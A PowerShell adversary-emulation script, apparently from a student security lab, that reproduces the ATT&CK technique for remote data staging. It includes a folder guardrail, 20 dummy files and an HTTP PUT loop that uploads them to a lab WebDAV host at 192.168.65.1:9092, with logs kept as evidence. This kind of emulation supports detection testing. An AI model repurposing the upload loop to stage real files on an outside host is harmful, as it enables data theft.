# ATA107 - T1074.002 Remote Data Staging (Windows)
# manual: subir 20 ficheros al WebDAV del host 192.168.65.1:9092 (staging remoto); guardarrail C:\lab-attack\ATA107\; sin red externa.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA107*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null

$hostSink = '192.168.65.1'
$port = 9092
$stage = Join-Path $dir 'staging_local'
New-Item -ItemType Directory -Force -Path $stage | Out-Null
1..20 | ForEach-Object { Set-Content -Path (Join-Path $stage ("stage_{0:D2}.txt" -f $_)) -Value ("TFG stage $_ " + ('G' * 64)) -Encoding ascii }
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$ok = 0
$hashes = @()
try {
    foreach ($f in Get-ChildItem $stage -File) {
        $sha = (Get-FileHash $f.FullName -Algorithm SHA256).Hash.ToLower()
        $r = Invoke-WebRequest -Uri "http://$hostSink`:$port/staging/$($f.Name)" -Method PUT -InFile $f.FullName -UseBasicParsing -TimeoutSec 10
        if ($r.StatusCode -in 200, 201, 204) { $ok++ }
        $hashes += "$($f.Name)=$sha"
    }
} catch {
    'ERROR: ' + $_.Exception.Message | Out-File (Join-Path $ev 'efecto_error.txt') -Encoding ascii
}
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
@(
    "ata=ATA107", "tecnica=T1074.002", "fuente=manual",
    "t0=$t0", "t1=$t1", "sink=http://$hostSink`:$port/staging/",
    "ficheros_subidos=$ok", "sha256=$($hashes -join ';')",
    "staging_ok=$($ok -eq 20)"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
